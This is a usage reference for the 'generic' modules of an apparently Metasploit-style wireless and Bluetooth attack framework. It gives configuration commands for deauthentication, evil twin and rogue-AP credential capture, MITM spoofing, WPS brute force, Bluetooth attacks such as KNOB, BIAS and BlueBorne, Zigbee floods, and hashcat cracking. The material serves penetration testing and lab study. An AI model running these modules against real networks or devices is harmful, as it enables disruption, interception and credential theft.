# 08 — Generic Modules

> Complete reference for all `generic/*` modules with full syntax, options and usage samples.

**Author:** André Henrique (@mrhenrike) | União Geek

---

## generic/wifi_lab — Wi-Fi Attack Lab

### handshake_snooper

PMKID-first pipeline + deauth-based WPA2 handshake capture.

```
use generic/wifi_lab/handshake_snooper
set interface wlan0mon
set target_bssid AA:BB:CC:DD:EE:FF
set target_channel 6
set pmkid_first true            # attempt PMKID before deauth (default: true)
set pmkid_timeout 30            # seconds for PMKID attempt
set deauth_count 5
set capture_seconds 30
run
```

---

### wpa3_attack_suite

WPA3 Dragonblood suite — SAE flood, CSA, Double SSID clone, downgrade.

```
use generic/wifi_lab/wpa3_attack_suite
set interface wlan0mon
set target_bssid AA:BB:CC:DD:EE:FF
set target_channel 6
# attack: downgrade | sae_flood | csa | double_ssid | timing | auto
set attack auto
set csa_harvest true            # capture PMKID/EAPOL during CSA window
set dry_run false
run
```

---

### fragattacks

FragAttacks CVE-2020-26140+ with 802.11ax HE capability detection.

```
use generic/wifi_lab/fragattacks
set interface wlan0mon
set target_bssid AA:BB:CC:DD:EE:FF
set target_ip 192.168.1.1
run
# Output will show HE (Wi-Fi 6) capability status on the interface PHY.
```

---

### evil_twin_workflow

Full evil-twin with optional credential capture verification.

```
use generic/wifi_lab/evil_twin_workflow
set target_ssid "MyNetwork"
set target_bssid AA:BB:CC:DD:EE:FF
set target_channel 6
set ap_interface wlan1
set deauth_interface wlan0mon
set verify_on_capture true
set handshake_capture_path /tmp/capture.cap
set captured_password s3cr3t
run
```

---

### mitm_wifi_bridge

ARP spoofing, DNS spoofing, and Ghost combo (bettercap).

```
use generic/wifi_lab/mitm_wifi_bridge
# mode: ap_bridge | arp_spoof | dns_spoof | ghost_combo | ssl_strip
set mode ghost_combo
set upstream_interface eth0
set target_ip 192.168.1.100
set dns_target "*.corp.local"
set dns_redirect_ip 192.168.1.50
run
```

---

### auth_flood

Authentication flood, amok mode, mesh flood (mdk4 backend).

```
use generic/wifi_lab/auth_flood
set interface wlan0mon
# mode: auth_flood | amok_mode | mesh_flood | eapol_start | cts_nav
set mode auth_flood
set target_bssid AA:BB:CC:DD:EE:FF
set backend mdk4
run
```

---

### adaptive_harvest

Score-driven PMKID/handshake collection with adaptive channel rotation.

```
use generic/wifi_lab/adaptive_harvest
set interface wlan0mon
set channels 1,6,11
set rounds 5
set round_seconds 25
run
```

---

### wardriving_deauth_loop

Automated wardriving: scan → deauth → capture cycles.

```
use generic/wifi_lab/wardriving_deauth_loop
set interface wlan0mon
set scan_seconds 30
set deauth_burst 5
set cycles 3
run
```

---

### wireless_ids

Passive IDS: baseline BSSID learning + rogue AP detection.

```
use generic/wifi_lab/wireless_ids
set baseline_csv /path/to/baseline_airodump.csv
set current_csv /path/to/current_airodump.csv
set min_signal -85
run
```

---

### awdl_attack

AWDL/AirDrop lab workflows using opendrop and owl.

```
use generic/wifi_lab/awdl_attack
set interface wlan0mon
# action: discover | send_test | dos_test
set action discover
run
```

---

### momo_integrated_attack

KARMA lure + PMKID-first + downgrade pressure in one authorised-lab workflow.

```
use generic/wifi_lab/momo_integrated_attack
set interface wlan0mon
set run_karma true
set run_pmkid true
set run_downgrade true
run
```

---

## generic/pcap — PCAP Analysis

### pcap_sql_workspace

SQLite workspace for PCAP metadata and analyst notes.

```
use generic/pcap/pcap_sql_workspace
set db_path .log/pcap_workspace.db
# action: init | import | list
set action init
run

set action import
set pcap_path /path/to/capture.pcap
set label "TrOll_2.4GHz lab capture 2026-04-08"
run

set action list
run
```

---

## generic/bluetooth — Bluetooth / BLE

### ble_btlejack

BLE sniff, jam, and hijack via BTLEJack.

```
use generic/bluetooth/ble_btlejack
# action: sniff | jam | hijack
set action sniff
set channel 37
set output_pcap .log/ble_capture.pcap
run
```

### bt_session_attack

KNOB, BIAS, BLUFFS session attacks.

```
use generic/bluetooth/bt_session_attack
set target_addr AA:BB:CC:DD:EE:FF
# attack: knob_bruteforce | bias | bluffs
set attack knob_bruteforce
set entropy 7
set allow_unsafe_knob false     # guard: blocks entropy < 7
run
```

### blueborne_attack

BlueBorne L2CAP overflow with kernel offset profiles.

```
use generic/bluetooth/blueborne_attack
set target_addr AA:BB:CC:DD:EE:FF
# kernel_profile: ubuntu_16_04 | ubuntu_18_04 | android_7_bluez | android_8_bluez
set kernel_profile ubuntu_18_04
run
```

---

## generic/external — External Bridges

### bruce_serial_bridge

Serial flow engine for Bruce firmware (ESP32). Full syntax:

```
use generic/external/bruce_serial_bridge
set serial_port /dev/ttyACM0
set baudrate 115200
# Predefined flow profiles:
set flow_profile capture_handshake_flow
# Other profiles:
#   baseline_status_flow, wifi_menu_navigation_flow, sniffer_capture_flow,
#   wifi_attack_lab_flow, deauth_clone_verify_flow, evil_portal_karma_flow,
#   raw_sniffer_probe_flow, navigation_recovery_flow, wifi_bruteforce_recon_flow,
#   captive_portal_endpoint_config_flow, repeater_wisp_setup_flow,
#   external_adapter_probe_flow, webui_password_flow, target_attack_stability_flow,
#   ble_recon_spam_flow, ble_badble_recovery_flow,
#   rf_spectrum_scan_flow, rf_jammer_stability_flow
set step_delay_ms 250
set read_window_ms 1200
set retries_per_step 1
set fail_on_expect_miss false
set output_log .log/bruce_serial_bridge.log
set dry_run false
run
```

Custom declarative flow (flow_json):

```
use generic/external/bruce_serial_bridge
set serial_port /dev/ttyACM0
set flow_json [{"command":"wifi scan","expect":"#","wait_ms":1200},{"command":"nav back","repeat":2,"expect":"#"}]
run
```

---

### bruce_upstream_tracker

Browse BruceDevices/firmware issues and PRs catalog.

```
use generic/external/bruce_upstream_tracker
# view: summary | top_useful | by_category | open_high | open_high_pending | open_pending
set view summary
run

set view open_pending
set limit 20
run

set view by_category
set category ble
run
```

---

### airgeddon_bridge

Airgeddon multi-mode subprocess bridge.

```
use generic/external/airgeddon_bridge
# mode: handshake | wps | evil_twin | pmkid | deauth | wpa3_downgrade | menu
set mode handshake
set interface wlan0mon
set target_bssid AA:BB:CC:DD:EE:FF
set target_channel 6
run
```

---

### wireless_tool_prereq_audit

Check all required external tools are installed and in PATH.

```
use generic/external/wireless_tool_prereq_audit
run
```

---

---

## New in v1.2.0 — integrated from submodule audit

### wpa3_sae_flood_native

Native Scapy SAE commit flood (WPA3 DoS / transition-mode downgrade). No external binary needed.

```
use generic/wifi_lab/wpa3_sae_flood_native
set interface wlan0mon
set target_bssid AA:BB:CC:DD:EE:FF
set channel 6
set frame_count 500        # 0 = continuous until Ctrl+C
set interval 0.0           # max speed
set randomize_src true     # spoof source MAC per frame
set i_know_scope true
run
```

---

### wifi_security_analyzer

Passive Wi-Fi scan: parses beacons/probe-responses, classifies each BSS as
WEP / WPA / WPA2-TKIP / WPA2-CCMP / WPA2-Enterprise / WPA3-SAE / WPA3-Transition / WPA3-OWE / OPEN.
Detects WPS, hidden SSIDs, and MFP status. No external binary needed.

```
use generic/wifi_lab/wifi_security_analyzer
set interface wlan0mon
set scan_time 30.0
set channel 0              # 0 = auto channel-hop
set filter_security ""     # filter: WEP, WPA2-TKIP, WPA3-SAE, OPEN, etc.
set show_hidden true
set i_know_scope true
run
```

---

### bully_bridge

WPS PIN brute-force via bully (C binary, GPL-2.0). Faster alternative to reaver on some APs.
Host prereq: `apt install bully`.

```
use generic/external/bully_bridge
set interface wlan0mon
set target_bssid AA:BB:CC:DD:EE:FF
set channel 6
set essid "TargetNetwork"
set pixie_dust false       # true = Pixie Dust attack
set pin ""                 # specific PIN to try (empty = full brute-force)
set i_know_scope true
run
```

---

### hostapd_wpe_bridge

WPE (Wireless Pwnage Edition) rogue AP for EAP/PEAP/MSCHAPv2 credential capture.
Host prereq: `apt install hostapd-wpe`.

```
use generic/external/hostapd_wpe_bridge
# mode: start | config | crack-hint
set mode start
set interface wlan0
set ssid "CorporateNetwork"
set channel 6
set log_file /tmp/wpe_credentials.log
set i_know_scope true
run

# After capture, show hashcat commands:
set mode crack-hint
run
```

---

### hcxdumptool_live_bridge

Live PMKID + EAPOL capture via hcxdumptool. Separate from `hcx_toolchain_bridge` (post-processing).
Host prereq: `apt install hcxdumptool hcxtools`.

```
use generic/external/hcxdumptool_live_bridge
set interface wlan0          # hcxdumptool handles monitor mode internally
set timeout 60               # seconds; 0 = unlimited
set target_bssid ""          # comma-separated BSSIDs, empty = all
set convert_after true       # auto-run hcxpcapngtool -> .hc22000 after capture
set i_know_scope true
run
# Output: .tmp/capture.pcapng + .tmp/capture.pcapng.hc22000
# Crack: hashcat -m 22000 .tmp/capture.pcapng.hc22000 wordlist.txt
```

---

### sniffair_passive_recon

SniffAir passive Wi-Fi recon + Auto-EAP credential capture. Can import SniffAir natively
(submodule) or invoke as subprocess. Host prereq: SniffAir submodule initialized.

```
use generic/external/sniffair_passive_recon
# mode: sniff | auto_eap | auto_psk | handshaker | info
set mode info
run

set mode sniff
set interface wlan0mon
set timeout 60
set i_know_scope true
run
```

---

### pwnagotchi_bridge

Pwnagotchi AI-based WPA handshake harvester: query device status, pull .pcap files via rsync/scp,
convert and crack with hashcat. Requires SSH access to the Pwnagotchi device (USB tether default: 10.0.0.2).

```
use generic/external/pwnagotchi_bridge
# mode: info | status | pull_handshakes | crack
set mode status
set device_ip 10.0.0.2
run

set mode pull_handshakes
set local_handshake_dir .tmp/pwnagotchi_handshakes
set i_know_scope true
run

set mode crack
set wordlist /path/to/rockyou.txt
run
```

---

### hashcatch_bridge

Purely passive WPA/WPA2 handshake capture (no transmission). Compatible with aircrack-ng and hashcat.
Host prereq: `hashcatch` binary in PATH or compiled in submodule.

```
use generic/external/hashcatch_bridge
set interface wlan0
set output_dir .tmp/hashcatch_captures
set timeout 120
set i_know_scope true
run
# Crack: aircrack-ng -w wordlist.txt .tmp/hashcatch_captures/*.cap
```

---

### wirespy_bridge

Automated Wi-Fi monitor mode, channel hopping, SSID discovery and evil-twin via Bash subprocess.
Host prereq: wirespy submodule initialized.

```
use generic/external/wirespy_bridge
# mode: monitor | scan | evil_twin | help
set mode monitor
set interface wlan0
set i_know_scope true
run
```

---

### knob_attack_bridge

KNOB (Key Negotiation Of Bluetooth) — forces 1-byte entropy in BT BR/EDR link key (CVE-2019-9506).

```
use generic/bluetooth/knob_attack_bridge
# mode: info | poc | internalblue
set mode info
run

set mode poc
set victim_a_mac AA:BB:CC:DD:EE:FF
set victim_b_mac 11:22:33:44:55:66
set attacker_hci hci0
set forced_entropy 1
set i_know_scope true
run
```

---

### bias_attack_bridge

BIAS (Bluetooth Impersonation AttackS) — impersonates BT BR/EDR device without LTK (CVE-2020-10135).

```
use generic/bluetooth/bias_attack_bridge
# mode: info | legacy_bypass | role_switch
set mode info
run

set mode legacy_bypass
set victim_mac AA:BB:CC:DD:EE:FF
set attacker_hci hci0
set i_know_scope true
run
```

---

### ble_bluffs_native

BLUFFS — BLE session key downgrade breaking forward and future secrecy (CVE-2023-24023).

```
use generic/bluetooth/ble_bluffs_native
# mode: info | poc | framing
set mode info
run

set mode poc
set victim_mac AA:BB:CC:DD:EE:FF
set attack_variant 1    # 1-6: see mode=info for description
set i_know_scope true
run
```

---

### ble_sweyntooth_bridge

SweynTooth 12+ BLE stack vulnerabilities affecting TI, NXP, Dialog, Microchip, ST, Telink, Cypress SoCs.
Host prereq: nRF52-series dongle with SweynTooth firmware. Submodule must be initialized.

```
use generic/bluetooth/ble_sweyntooth_bridge
set mode list
run

set mode llid_deadlock
set victim_mac AA:BB:CC:DD:EE:FF
set dongle_port /dev/ttyACM0
set i_know_scope true
run
```

---

### braktooth_bridge

BrAcketooth 16+ BT Classic (BR/EDR) stack attacks: deadlock, memory corruption, L2CAP abuse.
Targets Intel, Qualcomm, Jieli, Silicon Labs, Cypress, Espressif chipsets.

```
use generic/bluetooth/braktooth_bridge
set mode list
run

set mode lmp_max_slot_overflow
set victim_mac AA:BB:CC:DD:EE:FF
set device_port /dev/ttyUSB1
set i_know_scope true
run
```

---

### killerbee_zigbee_bridge

Zigbee / IEEE 802.15.4 attacks via KillerBee Python framework.
Requires 802.15.4 hardware (RZUSB, APIMOTE, CC253x, TelosB, etc.).
Install: `pip install killerbee` or initialize the killerbee submodule.

```
use generic/bluetooth/killerbee_zigbee_bridge
# mode: zbid | zbdump | zbreplay | zbstumbler | zbassocflood | zbscapy
set mode zbid
run

set mode zbdump
set channel 15
set output_file .tmp/zigbee_capture.pcap
set count 0
set i_know_scope true
run

set mode zbassocflood
set channel 15
set pan_id 0x1234
set flood_count 100
set i_know_scope true
run
```

---

*See [docs/FULL_CATALOG.md](../FULL_CATALOG.md) for the complete auto-generated module index.*
*See [docs/INTEGRATION_AUDIT.md](../INTEGRATION_AUDIT.md) for the full submodule audit.*
